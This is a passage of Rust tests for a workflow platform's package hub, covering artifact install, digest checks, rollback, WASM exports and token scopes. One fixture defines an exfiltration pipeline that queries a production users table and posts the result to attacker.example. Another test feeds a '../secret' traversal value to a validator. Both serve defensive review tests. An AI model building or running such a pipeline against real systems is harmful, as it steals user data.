            "rel_path": "wasm/core.wasm", "kind": "asset",
            "size_bytes": REFERENCED_MODULE.len(), "reason": "test",
            "artifact": { "sha256": sha256, "media_type": "application/wasm" }
        })
    }

    fn spec_of(document: &serde_json::Value) -> HubPackageSpec {
        serde_json::from_value(document["spec"].clone()).expect("package spec")
    }

    fn test_platform(root: &tempfile::TempDir) -> crate::platform::services::PlatformService {
        crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap()
    }

    /// Writes a bundle document and, optionally, the artifact beside it.
    ///
    /// This is the local file channel exactly as the README describes it:
    /// `./artifacts/<sha256>` next to the document.
    fn write_local_channel(
        dir: &Path,
        document: &serde_json::Value,
        artifact: Option<(&str, &[u8])>,
    ) -> PathBuf {
        let document_path = dir.join("package.json");
        std::fs::write(&document_path, serde_json::to_vec(document).unwrap()).unwrap();
        if let Some((sha256, bytes)) = artifact {
            let artifact_dir = dir.join("artifacts");
            std::fs::create_dir_all(&artifact_dir).unwrap();
            std::fs::write(artifact_dir.join(sha256), bytes).unwrap();
        }
        document_path
    }

    /// The bytes are in the Hub store, addressed by the digest the package
    /// declares, and the install fetches and verifies them.
    #[test]
    fn a_referenced_artifact_installs_from_the_hub_store() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let owner = "superadmin";
        let project = "default";

        let sha256 = platform
            .hub
            .store_artifact(REFERENCED_MODULE)
            .expect("the store takes the module");
        assert_eq!(sha256, sha256_hex(REFERENCED_MODULE));

        let document = wasm_bundle_document(
            "storepkg",
            "Stored Package",
            referenced_module_entry(&sha256),
        );
        platform
            .hub
            .install_artifact_payload_from(
                owner.to_string(),
                project.to_string(),
                "storepkg",
                "1.0.0",
                "",
                "local/storepkg",
                spec_of(&document),
                &platform.hub.artifact_store(),
            )
            .expect("a verified artifact installs");

        let installed = root
            .path()
            .join("users/superadmin/default/data/nodes/storepkg/wasm/core.wasm");
        assert_eq!(
            std::fs::read(&installed).unwrap(),
            REFERENCED_MODULE,
            "the fetched bytes are the module, not a placeholder"
        );
        assert_eq!(
            platform
                .node_registry
                .get_by_kind(owner, project, "n.x.storepkg.train")
                .expect("the node is installed")
                .manifest
                .source,
            crate::platform::model::NodePackageSource::Wasm
        );
    }

    /// The same package, installed from a file with its artifact beside it.
    #[test]
    fn a_referenced_artifact_installs_from_a_document_on_disk() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let channel = tempfile::tempdir().unwrap();
        let owner = "superadmin";
        let project = "default";

        let sha256 = sha256_hex(REFERENCED_MODULE);
        let document =
            wasm_bundle_document("filepkg", "File Package", referenced_module_entry(&sha256));
        let document_path = write_local_channel(
            channel.path(),
            &document,
            Some((&sha256, REFERENCED_MODULE)),
        );

        let review = platform
            .hub
            .review_local_node_bundle_document(
                owner,
                project,
                "filepkg",
                "1.0.0",
                "",
                &document_path,
            )
            .expect("review succeeds");
        assert!(review.installable);

        platform
            .hub
            .install_local_node_bundle_document(
                owner,
                project,
                "filepkg",
                "1.0.0",
                "",
                &document_path,
            )
            .expect("an artifact beside the document installs");

        assert_eq!(
            std::fs::read(
                root.path()
                    .join("users/superadmin/default/data/nodes/filepkg/wasm/core.wasm")
            )
            .unwrap(),
            REFERENCED_MODULE
        );
        assert!(
            platform
                .node_registry
                .get_by_kind(owner, project, "n.x.filepkg.train")
                .is_some()
        );
    }

    /// Installing the carried form and the referenced form of one bundle lands
    /// identical bytes, so referencing is a transport decision and nothing else.
    #[test]
    fn a_carried_package_and_a_referenced_package_install_the_same_bytes() {
        let carried_root = tempfile::tempdir().unwrap();
        let carried = test_platform(&carried_root);
        let referenced_root = tempfile::tempdir().unwrap();
        let referenced = test_platform(&referenced_root);
        let owner = "superadmin";
        let project = "default";

        let carried_document =
            wasm_bundle_document("bothpkg", "Both Package", carried_module_entry());
        carried
            .hub
            .install_local_node_bundle(
                owner,
                project,
                "bothpkg",
                "1.0.0",
                "",
                carried_document.clone(),
            )
            .expect("a carried package installs exactly as before");

        let sha256 = referenced
            .hub
            .store_artifact(REFERENCED_MODULE)
            .expect("the store takes the module");
        let referenced_document =
            wasm_bundle_document("bothpkg", "Both Package", referenced_module_entry(&sha256));
        referenced
            .hub
            .install_artifact_payload_from(
                owner.to_string(),
                project.to_string(),
                "bothpkg",
                "1.0.0",
                "",
                "local/bothpkg",
                spec_of(&referenced_document),
                &referenced.hub.artifact_store(),
            )
            .expect("the referenced package installs");

        for rel in ["definition.json", "icon.svg", "wasm/core.wasm"] {
            let installed = format!("users/superadmin/default/data/nodes/bothpkg/{rel}");
            assert_eq!(
                std::fs::read(carried_root.path().join(&installed)).unwrap(),
                std::fs::read(referenced_root.path().join(&installed)).unwrap(),
                "'{rel}' must not depend on how its bytes travelled"
            );
        }
    }

    // ── The review reads what the install writes ────────────────────────
    //
    // A referenced entry's bytes live on the channel, so a review that does not
    // fetch them scans an empty string. These prove that how a pipeline
    // travelled never changes the verdict it gets.

    /// A pipeline worth refusing: a public webhook that reads a credentialed
    /// database and posts the result to somebody else's host.
    const DANGEROUS_PIPELINE: &str = r#"{
        "apiVersion": "zebflow.com/v1",
        "kind": "Pipeline",
        "metadata": { "name": "exfiltrate" },
        "spec": {
            "nodes": [
                { "id": "t1", "kind": "n.trigger.webhook",
                  "config": { "path": "/public/exfiltrate", "method": "POST" } },
                { "id": "n1", "kind": "n.db.query",
                  "config": { "credential": "prod-postgres", "query": "select * from users" } },
                { "id": "n2", "kind": "n.http.request",
                  "config": { "url": "https://attacker.example/collect" } }
            ]
        }
    }"#;

    /// One pipeline package whose single entry is supplied by the caller, so
    /// the carried and referenced forms differ in nothing else.
    fn pipeline_package(asset_kind: &str, entry: serde_json::Value) -> HubPackageSpec {
        serde_json::from_value(serde_json::json!({
            "asset_kind": asset_kind,
            "title": "Exfiltrator",
            "description": "A package whose pipeline may travel beside the document.",
            "files": [entry]
        }))
        .expect("package spec")
    }

    fn carried_pipeline_entry() -> serde_json::Value {
        serde_json::json!({
            "rel_path": "pipelines/exfiltrate.zf.json", "kind": "pipeline",
            "size_bytes": DANGEROUS_PIPELINE.len(), "reason": "test",
            "content": DANGEROUS_PIPELINE
        })
    }

    fn referenced_pipeline_entry(sha256: &str) -> serde_json::Value {
        serde_json::json!({
            "rel_path": "pipelines/exfiltrate.zf.json", "kind": "pipeline",
            "size_bytes": DANGEROUS_PIPELINE.len(), "reason": "test",
            "artifact": { "sha256": sha256, "media_type": "application/json" }
        })
    }

    /// The same pipeline, carried and referenced, reviewed through a channel
    /// that holds it: one verdict, because a transport decision is not a safety
    /// decision.
    #[test]
    fn a_referenced_pipeline_reviews_exactly_as_the_carried_one_does() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let sha256 = platform
            .hub
            .store_artifact(DANGEROUS_PIPELINE.as_bytes())
            .expect("the store takes the pipeline");

        let review_of = |entry: serde_json::Value| {
            platform
                .hub
                .review_artifact_payload(
                    "superadmin",
                    "default",
                    "exfilpkg",
                    "1.0.0",
                    "",
                    &pipeline_package(HUB_ASSET_KIND_PIPELINE_BUNDLE, entry),
                    &platform.hub.artifact_store(),
                )
                .expect("the review runs")
        };

        let carried = review_of(carried_pipeline_entry());
        let referenced = review_of(referenced_pipeline_entry(&sha256));

        assert!(
            carried
                .public_endpoints
                .contains(&"/public/exfiltrate".to_string()),
            "the carried form is the control and must see the endpoint"
        );
        assert_eq!(
            serde_json::to_value(&referenced).unwrap(),
            serde_json::to_value(&carried).unwrap(),
            "how the bytes travelled must not change a single reviewed fact"
        );
    }

    /// A channel with nowhere to look does not clear the package: the review
    /// says it cannot read the pipeline, which is a refusal and not a pass.
    #[test]
    fn a_pipeline_the_channel_cannot_resolve_blocks_the_review() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let sha256 = sha256_hex(DANGEROUS_PIPELINE.as_bytes());

        let review = platform
            .hub
            .review_artifact_payload(
                "superadmin",
                "default",
                "exfilpkg",
                "1.0.0",
                "",
                &pipeline_package(
                    HUB_ASSET_KIND_PIPELINE_BUNDLE,
                    referenced_pipeline_entry(&sha256),
                ),
                &HubArtifactChannel::unresolvable(CHANNEL_WITHOUT_AN_ARTIFACT_LOCATION),
            )
            .expect("the review runs");

        assert!(
            !review.installable && review.risk_level == "blocked",
            "an unreadable pipeline must block, not pass: {review:?}"
        );
        assert!(
            review
                .violations
                .iter()
                .any(|item| item.starts_with("pipelines/hub/exfilpkg/exfiltrate.zf.json:")),
            "the violation names the destination the install would write: {:?}",
            review.violations
        );
        assert!(
            review.nodes_used.is_empty() && review.public_endpoints.is_empty(),
            "nothing may be reported as reviewed when nothing could be read"
        );
    }

    /// The refusal lands before the install writes, so a package it cannot
    /// review leaves the project exactly as it found it.
    #[test]
    fn an_unreadable_pipeline_refuses_the_install_before_anything_is_written() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let sha256 = sha256_hex(DANGEROUS_PIPELINE.as_bytes());
        let document = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "HubPackage",
            "metadata": { "name": "exfilpkg", "version": "1.0.0" },
            "spec": serde_json::to_value(pipeline_package(
                HUB_ASSET_KIND_NODE_BUNDLE,
                referenced_pipeline_entry(&sha256),
            ))
            .unwrap()
        });

        let error = platform
            .hub
            .install_local_node_bundle(
                "superadmin",
                "default",
                "exfilpkg",
                "1.0.0",
                "pipelines/hub/exfilpkg",
                document,
            )
            .expect_err("a package the review cannot read must not install");
        assert_eq!(error.code, "NODE_BUNDLE_INSTALL_REFUSED");
        assert!(
            !root
                .path()
                .join("users/superadmin/default/data/pipelines/hub/exfilpkg")
                .exists(),
            "the refusal must precede every write"
        );
    }

    /// Installs the carried bundle, then returns everything a refused second
    /// install must leave exactly as it found it.
    fn install_previous_state(
        root: &tempfile::TempDir,
        platform: &crate::platform::services::PlatformService,
        package_id: &str,
    ) -> (
        Vec<u8>,
        Vec<u8>,
        crate::contracts::kinds::DependencyLockSpec,
    ) {
        let document =
            wasm_bundle_document(package_id, "Installed Package", carried_module_entry());
        platform
            .hub
            .install_local_node_bundle("superadmin", "default", package_id, "1.0.0", "", document)
            .expect("the first install succeeds");
        let package_dir = root
            .path()
            .join(format!("users/superadmin/default/data/nodes/{package_id}"));
        (
            std::fs::read(package_dir.join("definition.json")).unwrap(),
            std::fs::read(package_dir.join("wasm/core.wasm")).unwrap(),
            platform
                .dependency_lock
                .read("superadmin", "default")
                .unwrap(),
        )
    }

    fn assert_previous_state(
        root: &tempfile::TempDir,
        platform: &crate::platform::services::PlatformService,
        package_id: &str,
        previous: (
            Vec<u8>,
            Vec<u8>,
            crate::contracts::kinds::DependencyLockSpec,
        ),
    ) {
        let package_dir = root
            .path()
            .join(format!("users/superadmin/default/data/nodes/{package_id}"));
        assert_eq!(
            std::fs::read(package_dir.join("definition.json")).unwrap(),
            previous.0,
            "the refused install must not have rewritten the definition"
        );
        assert_eq!(
            std::fs::read(package_dir.join("wasm/core.wasm")).unwrap(),
            previous.1,
            "the refused install must not have rewritten the module"
        );
        assert_eq!(
            platform
                .dependency_lock
                .read("superadmin", "default")
                .unwrap(),
            previous.2,
            "the lock still describes what is actually installed"
        );
        assert!(
            platform
                .node_registry
                .get_by_kind("superadmin", "default", &format!("n.x.{package_id}.train"))
                .is_some(),
            "the previously installed node still resolves"
        );
    }

    /// Bytes that hash to something else are not the bytes the package named,
    /// so the install refuses and the previous release stays in place.
    #[test]
    fn a_digest_mismatch_refuses_the_install_and_leaves_the_previous_state() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let channel = tempfile::tempdir().unwrap();
        let previous = install_previous_state(&root, &platform, "tamperpkg");

        // The document names the real module's digest; the file sitting at that
        // address is something else, which is what tampering looks like.
        let sha256 = sha256_hex(REFERENCED_MODULE);
        let document = wasm_bundle_document(
            "tamperpkg",
            "Tampered Package",
            referenced_module_entry(&sha256),
        );
        let mut tampered = REFERENCED_MODULE.to_vec();
        *tampered.last_mut().unwrap() ^= 0xff;
        let document_path =
            write_local_channel(channel.path(), &document, Some((&sha256, &tampered)));

        let error = platform
            .hub
            .install_local_node_bundle_document(
                "superadmin",
                "default",
                "tamperpkg",
                "1.0.0",
                "",
                &document_path,
            )
            .expect_err("a digest mismatch must refuse the install");
        assert_eq!(error.code, "HUB_ARTIFACT_DIGEST_MISMATCH");
        assert_previous_state(&root, &platform, "tamperpkg", previous);
    }

    /// A reference the channel cannot answer is a failed fetch, and a failed
    /// fetch leaves the previous state intact.
    #[test]
    fn a_missing_artifact_refuses_the_install_and_leaves_the_previous_state() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let channel = tempfile::tempdir().unwrap();
        let previous = install_previous_state(&root, &platform, "missingpkg");

        let document = wasm_bundle_document(
            "missingpkg",
            "Missing Package",
            referenced_module_entry(&sha256_hex(REFERENCED_MODULE)),
        );
        let document_path = write_local_channel(channel.path(), &document, None);

        let error = platform
            .hub
            .install_local_node_bundle_document(
                "superadmin",
                "default",
                "missingpkg",
                "1.0.0",
                "",
                &document_path,
            )
            .expect_err("a missing artifact must refuse the install");
        assert_eq!(error.code, "HUB_ARTIFACT_MISSING");
        assert_previous_state(&root, &platform, "missingpkg", previous);
    }

    /// A document posted as a body says nothing about where its artifacts live,
    /// so that channel refuses a reference rather than writing an empty file.
    #[test]
    fn a_channel_without_a_location_refuses_a_referenced_artifact() {
        let root = tempfile::tempdir().unwrap();
        let platform = test_platform(&root);
        let document = wasm_bundle_document(
            "bodypkg",
            "Body Package",
            referenced_module_entry(&sha256_hex(REFERENCED_MODULE)),
        );

        let error = platform
            .hub
            .install_local_node_bundle("superadmin", "default", "bodypkg", "1.0.0", "", document)
            .expect_err("a channel with no location must refuse");
        assert_eq!(error.code, "HUB_ARTIFACT_UNRESOLVED");
        assert!(
            !root
                .path()
                .join("users/superadmin/default/data/nodes/bodypkg")
                .exists(),
            "a refused install writes nothing at all"
        );
    }

    /// A trigger's inbound handler is its run binding, so a WASM trigger runs
    /// the same way a WASM action does.
    ///
    /// This is the runtime half of separating role from implementation: before
    /// the run binding existed, a trigger could only be composite.
    #[tokio::test]
    async fn a_wasm_trigger_runs_its_handler_export() {
        use base64::Engine as _;

        let root = tempfile::tempdir().unwrap();
        let platform = std::sync::Arc::new(
            crate::platform::services::PlatformService::from_config(
                crate::platform::model::PlatformConfig {
                    data_root: root.path().to_path_buf(),
                    default_password: "test-password".to_string(),
                    ..Default::default()
                },
            )
            .unwrap(),
        );
        let owner = "superadmin";
        let project = "default";

        let module =
            include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");
        let mut trigger = wasm_node_entry("n.x.wasmtrig.inbox", "Inbox", "e2e_train");
        trigger["trigger"] = serde_json::json!({
            "type": "webhook",
            "path_template": "/wasmtrig/{{ hook_key }}"
        });
        trigger["definition"]["input_pins"] = serde_json::json!([]);
        trigger["definition"]["config_schema"] = serde_json::json!({
            "type": "object",
            "properties": { "hook_key": { "type": "string" } }
        });
        trigger["definition"]["fields"] = serde_json::json!([{
            "name": "hook_key",
            "label": "Hook Key",
            "type": "text",
            "help": "Key used to build the public webhook path."
        }]);

        let definition = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": "wasmtrig", "version": "1.0.0" },
            "spec": {
                "package": "wasmtrig",
                "version": "1.0.0",
                "title": "WASM Trigger",
                "description": "A trigger whose inbound handler is a WASM export.",
                "icon": "icon.svg",
                "credentials": [],
                "functions": {},
                "modules": {
                    "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                },
                "nodes": [trigger]
            }
        })
        .to_string();
        let icon = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";

        let payload: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": "node_bundle",
            "title": "WASM Trigger",
            "description": "Exercises a WASM trigger handler.",
            "files": [
                { "rel_path": "definition.json", "kind": "node_definition",
                  "size_bytes": definition.len(), "reason": "test", "content": definition },
                { "rel_path": "icon.svg", "kind": "asset",
                  "size_bytes": icon.len(), "reason": "test", "content": icon },
                { "rel_path": "wasm/core.wasm", "kind": "asset",
                  "size_bytes": module.len(), "reason": "test", "encoding": "base64",
                  "content": base64::engine::general_purpose::STANDARD.encode(module) }
            ]
        }))
        .unwrap();

        platform
            .hub
            .install_artifact_payload(
                owner.to_string(),
                project.to_string(),
                "wasmtrig",
                "1.0.0",
                "",
                "test/wasmtrig",
                payload,
            )
            .expect("install succeeds");

        let installed = platform
            .node_registry
            .get_by_kind(owner, project, "n.x.wasmtrig.inbox")
            .expect("trigger is installed");
        assert!(
            installed.manifest.trigger.is_some(),
            "the node keeps its trigger role"
        );
        assert_eq!(
            installed.manifest.source,
            crate::platform::model::NodePackageSource::Wasm,
            "and its implementation is WASM"
        );

        // The engine routes a trigger through its run binding, so the handler
        // export is what actually processes the inbound event.
        let (module_spec, export) = installed.manifest.wasm_target().expect("wasm target");
        let output = crate::pipeline::engines::wasm_host::run_wasm_export(
            "n.x.wasmtrig.inbox",
            &installed.package_dir,
            module_spec,
            export,
            &serde_json::json!({ "hook_key": "abc" }),
            &serde_json::json!({ "update_id": 7 }),
            &serde_json::json!({ "owner": owner, "project": project }),
        )
        .expect("handler runs");
        assert_eq!(output["ok"], serde_json::json!(true));
        assert_eq!(output["export"], serde_json::json!("e2e_train"));
    }

    /// Installs a real WASM bundle whose two nodes share one module through
    /// distinct exports, then runs both.
    ///
    /// This is the regression guard for the entry-point collision: before the
    /// run binding existed, every WASM node in a package resolved to the same
    /// default export.
    #[tokio::test]
    async fn installed_wasm_nodes_execute_their_own_exports() {
        use base64::Engine as _;

        let root = tempfile::tempdir().unwrap();
        let platform = std::sync::Arc::new(
            crate::platform::services::PlatformService::from_config(
                crate::platform::model::PlatformConfig {
                    data_root: root.path().to_path_buf(),
                    default_password: "test-password".to_string(),
                    ..Default::default()
                },
            )
            .unwrap(),
        );
        let owner = "superadmin";
        let project = "default";

        let module =
            include_bytes!("../../../tests/fixtures/contracts/node-bundle/two-exports.wasm");
        let definition = serde_json::json!({
            "apiVersion": "zebflow.com/v1",
            "kind": "NodeBundle",
            "metadata": { "name": "e2ewasm", "version": "1.0.0" },
            "spec": {
                "package": "e2ewasm",
                "version": "1.0.0",
                "title": "E2E WASM Bundle",
                "description": "Two WASM nodes sharing one module through distinct exports.",
                "icon": "icon.svg",
                "credentials": [],
                "functions": {},
                "modules": {
                    "core": { "path": "wasm/core.wasm", "abi": "zebflow-wasm-json-v1" }
                },
                "nodes": [
                    wasm_node_entry("n.x.e2ewasm.train", "E2E Train", "e2e_train"),
                    wasm_node_entry("n.x.e2ewasm.score", "E2E Score", "e2e_score")
                ]
            }
        })
        .to_string();
        let icon = "<svg xmlns=\"http://www.w3.org/2000/svg\"/>";

        let payload: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": "node_bundle",
            "title": "E2E WASM",
            "description": "Exercises per-node WASM export resolution.",
            "files": [
                {
                    "rel_path": "definition.json",
                    "kind": "node_definition",
                    "size_bytes": definition.len(),
                    "reason": "test",
                    "content": definition
                },
                {
                    "rel_path": "icon.svg",
                    "kind": "asset",
                    "size_bytes": icon.len(),
                    "reason": "test",
                    "content": icon
                },
                {
                    "rel_path": "wasm/core.wasm",
                    "kind": "asset",
                    "size_bytes": module.len(),
                    "reason": "test",
                    "encoding": "base64",
                    "content": base64::engine::general_purpose::STANDARD.encode(module)
                }
            ]
        }))
        .unwrap();

        platform
            .hub
            .install_artifact_payload(
                owner.to_string(),
                project.to_string(),
                "e2ewasm",
                "1.0.0",
                "",
                "test/e2ewasm",
                payload,
            )
            .expect("install succeeds");

        // Each node resolves its own export from the shared module.
        for (kind, export) in [
            ("n.x.e2ewasm.train", "e2e_train"),
            ("n.x.e2ewasm.score", "e2e_score"),
        ] {
            let installed = platform
                .node_registry
                .get_by_kind(owner, project, kind)
                .unwrap_or_else(|| panic!("{kind} is installed"));
            assert_eq!(
                installed.manifest.source,
                crate::platform::model::NodePackageSource::Wasm
            );
            let (module_spec, resolved) = installed.manifest.wasm_target().expect("wasm target");
            assert_eq!(module_spec.path, "wasm/core.wasm");
            assert_eq!(resolved, export);

            let output = crate::pipeline::engines::wasm_host::execute_wasm_node(
                kind.to_string(),
                serde_json::json!({}),
                platform.clone(),
                crate::pipeline::nodes::NodeExecutionInput {
                    node_id: "n1".to_string(),
                    input_pin: "in".to_string(),
                    payload: serde_json::json!({ "value": 2 }),
                    metadata: serde_json::json!({ "owner": owner, "project": project }),
                    bus: None,
                },
            )
            .await
            .unwrap_or_else(|err| panic!("{kind} executes: {}", err.message));

            assert_eq!(output.len(), 1);
            assert_eq!(output[0].payload["ok"], serde_json::json!(true));
            assert_eq!(output[0].payload["engine"], serde_json::json!("wasm"));
            assert_eq!(
                output[0].payload["contract"],
                serde_json::json!("zebflow-wasm-json-v1")
            );
            assert_eq!(
                output[0].payload["export"],
                serde_json::json!(export),
                "each node must run its own export, not a shared default"
            );
        }
    }

    #[test]
    fn failed_node_bundle_install_restores_files_and_dependency_lock() {
        let root = tempfile::tempdir().unwrap();
        let platform = crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap();
        let owner = "superadmin";
        let project = "default";
        let before = platform.dependency_lock.read(owner, project).unwrap();
        let payload: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": "node_bundle",
            "title": "Broken node bundle",
            "description": "Exercises transactional recovery.",
            "files": [
                {
                    "rel_path": "README.md",
                    "kind": "documentation",
                    "size_bytes": 7,
                    "reason": "test",
                    "content": "written"
                },
                {
                    "rel_path": "definition.json",
                    "kind": "node_definition",
                    "size_bytes": 2,
                    "reason": "test",
                    "content": "{}"
                }
            ]
        }))
        .unwrap();

        let error = platform
            .hub
            .install_artifact_payload(
                owner.to_string(),
                project.to_string(),
                "broken-bundle",
                "1.0.0",
                "",
                "test/broken-bundle",
                payload,
            )
            .unwrap_err();
        assert_eq!(error.code, "NODE_MANIFEST_PARSE");
        let package_dir = root
            .path()
            .join("users/superadmin/default/data/nodes/broken-bundle");
        assert!(!package_dir.join("README.md").exists());
        assert!(!package_dir.join("definition.json").exists());
        assert_eq!(
            platform.dependency_lock.read(owner, project).unwrap(),
            before
        );
    }

    #[test]
    fn successful_node_bundle_install_registers_and_locks_the_exact_bundle() {
        let root = tempfile::tempdir().unwrap();
        let platform = crate::platform::services::PlatformService::from_config(
            crate::platform::model::PlatformConfig {
                data_root: root.path().to_path_buf(),
                default_password: "test-password".to_string(),
                ..Default::default()
            },
        )
        .unwrap();
        let owner = "superadmin";
        let project = "default";
        // Rename the whole package identity: a kind is owned by its package, so
        // the slug, metadata name, and kind namespace must move together.
        let definition =
            include_str!("../../pipeline/nodes/bundled/openai-embedding/definition.json")
                .replace("n.ai.embedding", "n.x.openai_embedding_test.embed")
                .replace("\"openai-embedding\"", "\"openai-embedding-test\"");
        let function =
            include_str!("../../pipeline/nodes/bundled/openai-embedding/functions/embed.zf.json");
        // The bundle declares an icon, so the install must ship it. A declared
        // artifact that never lands now fails the registry refresh.
        let icon = include_str!("../../pipeline/nodes/bundled/openai-embedding/icon.svg");
        let node_icon =
            include_str!("../../pipeline/nodes/bundled/openai-embedding/icons/embedding.svg");
        let payload: HubPackageSpec = serde_json::from_value(serde_json::json!({
            "asset_kind": "node_bundle",
            "title": "OpenAI embedding",
            "description": "Exercises successful dependency installation.",
            "files": [
                {
                    "rel_path": "definition.json",
                    "kind": "node_definition",
                    "size_bytes": definition.len(),
                    "reason": "test",
                    "content": definition
                },
                {
                    "rel_path": "functions/embed.zf.json",
                    "kind": "pipeline",
                    "size_bytes": function.len(),
                    "reason": "test",
                    "content": function
                },
                {
                    "rel_path": "icon.svg",
                    "kind": "asset",
                    "size_bytes": icon.len(),
                    "reason": "test",
                    "content": icon
                },
                {
                    "rel_path": "icons/embedding.svg",
                    "kind": "asset",
                    "size_bytes": node_icon.len(),
                    "reason": "test",
                    "content": node_icon
                }
            ]
        }))
        .unwrap();

        let result = platform
            .hub
            .install_artifact_payload(
                owner.to_string(),
                project.to_string(),
                "openai-embedding-test",
                "1.0.0",
                "",
                "test/openai-embedding-test",
                payload,
            )
            .unwrap();
        assert_eq!(result.install_root, "nodes/openai-embedding-test");
        assert!(
            platform
                .node_registry
                .merged_definitions(owner, project)
                .iter()
                .any(|definition| definition.kind == "n.x.openai_embedding_test.embed")
        );
        let lock = platform.dependency_lock.read(owner, project).unwrap();
        let bundle = lock
            .nodes
            .bundles
            .values()
            .find(|bundle| bundle.definitions == ["n.x.openai_embedding_test.embed"])
            .unwrap();
        assert_eq!(
            bundle.source,
            crate::contracts::kinds::DependencyLockSource::Hub
        );
        assert_eq!(bundle.source_id, "test/openai-embedding-test");
        assert_eq!(bundle.entry, "nodes/openai-embedding-test/definition.json");
    }

    #[test]
    fn normalize_scopes_only_keeps_known_hub_scopes() {
        let scopes = normalize_scopes(&[
            "hub:publish".to_string(),
            " hub:read ".to_string(),
            "hub:publish".to_string(),
            "custom:other".to_string(),
        ]);
        assert_eq!(
            scopes,
            vec!["hub:publish".to_string(), "hub:read".to_string()]
        );
    }

    #[test]
    fn apply_scope_flags_sets_explicit_permissions() {
        let token = apply_scope_flags(HubToken {
            token_id: "mkt_1".to_string(),
            authority_id: "mka_1".to_string(),
            publisher_pk: "mpub_1".to_string(),
            owner: "superadmin".to_string(),
            project: "default".to_string(),
            publisher_id: "zebflow-official".to_string(),
            publisher_display_name: "Zebflow Official".to_string(),
            publisher_url: "/publishers/zebflow-official".to_string(),
            publisher_email: "publishers@zebflow.com".to_string(),
            title: "Official".to_string(),
            secret_hash: "hash".to_string(),
            scopes: vec!["hub:read".to_string(), "hub:publish".to_string()],
            scope_read: false,
            scope_publish: false,
            scope_manage: false,
            expires_at: None,
            last_used_at: None,
            revoked_at: None,
            created_at: 0,
            updated_at: 0,
        });
        assert!(token.scope_read);
        assert!(token.scope_publish);
        assert!(!token.scope_manage);
        assert!(token.grants_scope("hub:read"));
        assert!(token.grants_scope("hub:publish"));
        assert!(!token.grants_scope("hub:manage"));
    }

    #[test]
    fn publisher_scopes_respect_current_permissions() {
        let publisher = HubPublisher {
            authority_id: DEFAULT_HUB_SERVICE_INSTANCE_ID.to_string(),
            publisher_pk: "mpub_1".to_string(),
            owner: HUB_SERVICE_SCOPE_OWNER.to_string(),
            project: HUB_SERVICE_SCOPE_PROJECT.to_string(),
            publisher_id: "zebflow-official".to_string(),
            display_name: "Zebflow Official".to_string(),
            publisher_url: "/publishers/zebflow-official".to_string(),
            email: "publishers@zebflow.com".to_string(),
            description: String::new(),
            icon_url: String::new(),
            website_url: String::new(),
            enabled: true,
            can_read: true,
            can_publish: false,
            can_manage: false,
            max_packages: 20,
            max_package_bytes: 10 * 1024 * 1024,
            max_media_files: 8,
            max_image_bytes: 2 * 1024 * 1024,
            created_at: 0,
            updated_at: 0,
        };
        assert!(validate_publisher_scopes(&publisher, &["hub:read".to_string()]).is_ok());
        let err = validate_publisher_scopes(&publisher, &["hub:publish".to_string()])
            .expect_err("publish scope should be denied");
        assert_eq!(err.code, "HUB_PUBLISHER_SCOPE_DENIED");
    }

    #[test]
    fn hub_versions_are_single_safe_path_segments() {
        assert!(validate_hub_version("1.0.0").is_ok());
        assert!(validate_hub_version("1.0.0-beta_1").is_ok());
        assert!(validate_hub_version("../secret").is_err());
        assert!(validate_hub_version("1/2").is_err());
        assert!(validate_hub_version("release candidate").is_err());
    }

    #[test]
    fn ownerless_hub_api_base_builds_hub_routes() {
        let repo = PlatformHubRepository {
            source_id: "pmr_1".to_string(),
            owner_user_id: "user_1".to_string(),
            owner: "superadmin".to_string(),
            repository_id: "zebflow-hub".to_string(),
            title: "Zebflow Hub".to_string(),
            base_url: "https://hub.zebflow.com/api".to_string(),
            remote_owner: String::new(),
            remote_project: String::new(),
            read_token: String::new(),
            visibility: "public".to_string(),
            enabled: true,
            created_at: 0,
            updated_at: 0,
        };

        assert_eq!(
            remote_hub_url_for_platform(&repo, "remote/assets"),
            "https://hub.zebflow.com/api/hub/remote/assets"
        );
    }

    /// Builds a platform with the hub service enabled, one publisher that may
    /// publish, and one pipeline to publish from.
    fn hub_publish_fixture(
        label: &str,
    ) -> (
        tempfile::TempDir,
        std::sync::Arc<crate::platform::services::PlatformService>,
    ) {
        let root = tempfile::tempdir().unwrap();
        let platform = std::sync::Arc::new(
            crate::platform::services::PlatformService::from_config(
                crate::platform::model::PlatformConfig {
                    data_root: root.path().to_path_buf(),
                    default_password: "test-password".to_string(),
                    ..Default::default()
                },
            )
            .unwrap(),
        );
        platform
            .hub
            .ensure_default_service_instance("standalone", "http://127.0.0.1/api", true)
            .expect("hub service enabled");
        platform
            .hub
            .set_authority_enabled("superadmin", "default", true)
            .expect("authority enabled");
        platform
            .hub
            .upsert_publisher(
                "superadmin",
                "default",
                "calc-studio",
                "Calc Studio",
                "https://publishers.example/calc-studio",
                "publishers@example.com",
                "",
                "",
                "",
                true,
                true,
                true,
                true,
                20,
                10 * 1024 * 1024,
                8,
                2 * 1024 * 1024,
            )
            .expect("publisher");
        write_publish_source(&platform, label);
        (root, platform)
    }

    /// Writes the pipeline that the fixture publishes. Called again with a
    /// different label to change the source, and so the artifact digest.
    fn write_publish_source(platform: &crate::platform::services::PlatformService, label: &str) {
        platform
            .projects
            .upsert_pipeline_definition(
                "superadmin",
                "default",
                "pipelines/calc.zf.json",
                label,
                label,
                "manual",
                &serde_json::json!({
